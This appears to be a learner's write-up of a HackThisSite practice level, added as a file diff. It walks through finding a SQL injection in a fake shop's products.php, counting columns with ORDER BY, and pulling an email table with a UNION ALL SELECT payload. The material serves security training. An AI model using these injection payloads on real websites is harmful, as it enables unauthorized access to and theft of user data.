@@ -1,0 +1,155 @@
+---------------------------------
+This level confused me a lot and I feel like some kind of mistake has been made here. Just like in basic lvl 5, i think...
+I say so becous i feel like i should use escape char ' before i inject my attack but it is not required but when i was looking up those kind of attacks. Ammount of collumns also is wierd I am almost certain there should be 3 collumns but injection is only correct if i treat this db as it would have 4 collumns... It is very bizarre but i ll explain more along with this write up, as i walkthrou process it took me to extract requested data.
+
+Anyhow...
+
+Goal of this lvl is to find on website list of their users.
+
+On main page there are 2 links that leads us to fur coats and aligathor accesories.
+There is also form to submit my email to their mailing list and that was firsth thing i tinkered with.
+
+
+
+Using BurpSuite i captured request that is submited to server and it looks like this:
+
+
+
+POST /missions/realistic/4/addemail.php HTTP/2                <----- Seems like script that adds email is addemail.php
+Host: www.hackthissite.org
+Cookie: HackThisSite=furii2qoqlt5ea2cs3nphhdqp4
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://www.hackthissite.org/missions/realistic/4/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 22
+Origin: https://www.hackthissite.org
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+email=your%40email.com                                    <------- here is parameter named 'email' that we send by POST
+                                                                   to mentioned script. It is our email URL encoded.
+
+
+
+
+Next I examinated links. One of them leaded to table with fur coats:
+https://www.hackthissite.org/missions/realistic/4/products.php?category=1
+
+
+Another one had Aligathor accesories innit:
+https://www.hackthissite.org/missions/realistic/4/products.php?category=2
+
+
+Every row in table had 3 elements:
+-Image
+-description of product
+-price or it
+
+Therefore i thought db have 3 columns, but it turned out that I was wrong.
+
+
+At this point it looked like products.php have script that is populating table with data. Something like:
+
+
+        SELECT img, description, price FROM products WHERE category = '$category"
+
+
+
+I started to test for possible SQL injection with excape sign and giberish after:
+        
+        https://www.hackthissite.org/missions/realistic/4/products.php?category=1'asdf
+
+
+
+
+
+
+Website tried to fill the table but it coudn't proceed my imput and it returned something like wierd looking template for table. That's what i found in source code:
+
+
+		 <tr>
+            <td>
+                <img src=".jpg">            <------ That would be for image
+            </td>
+            <td width=5>
+                &nbsp;                      <------ Here We have description
+            </td>
+            <td valign="top">
+                <font face="verdana">
+                <br />
+                <br />
+                <b>
+                </b>
+            </font>
+            </td>
+        </tr>
+        <tr>
+            <td>
+                &nbsp;                      <----- Must be the price
+            </td>
+        </tr>
+        </table></font></td></tr></table></body></html>
+
+
+However i would look at it it looks to me like db have 3 collumns for now
+but NOPE later i ll find out that it have actually 4. I May not understand something here,
+maybe i missed things... dunnow tbh... I'm sure tho that i must learn a lot more but ok... 
+Lets continue ;]
+
+I started to test for basic injections with ' OR 1 = 1 to see if it will print both categories but for some reason it didnt work and i am fairly sure it should... Escape character and add logic that is always true, right?
+
+    www.hackthissite.org/missions/realistic/4/products.php?category=1' OR 1=1
+
+
+Well it didn't work till i omited quotation mark
+
+    www.hackthissite.org/missions/realistic/4/products.php?category=1 OR 1=1
+
+
+Now somehow it worked... I think it is some mistake with lvl design but for time being i am just gonna accept that
+I found SQL injection voulrnability. Now about my theory with 3 columns. I tryed to confirm it with injecting a series of ORDER BY clauses while incrementing the specified column index until error woudl pop up, so it should look like:
+
+
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+etc.
+
+
+BUT... again escape character didn't work out for me so instead of using attack like:
+
+    https://www.hackthissite.org/missions/realistic/4/products.php?category=1' ORDER BY 1
+
+
+I had to omit escape character and do:
+
+    https://www.hackthissite.org/missions/realistic/4/products.php?category=1 ORDER BY 1
+
+
+
+That was only part of my problem with this lvl. I absolutely expected that ORDER BY 4 would return me error...
+Well... It didn't. I managed to get error while trying to ORDER BY 5.
+
+Sooo.. we have 4 columns? Hmm... ok..
+
+In order to extract email list i tryed many things but in the end UNION attack worked... kinda...
+Again, some things happend and I cannot explain them at all. 
+
+First of all I had  to use UNION ALL attack not UNION nonetheless both should work because there
+should not be any duplicates. Also, escape character  didn't work again.
+
+I knew that first collumn have wrong type of data since there was image so i could use second or third collumn to print emails:
+
+ https://www.hackthissite.org/missions/realistic/4/products.php?category=1 UNION ALL SELECT null, *, null, null FROM email;
+
+
+It was... strugle probly more than it had to, but i am happy i completed the level so i can move on to the next one.
+BTW its late my grammar doesnt work i should check it tomorrow for typos but for now:
+Veni Vidi Vici!
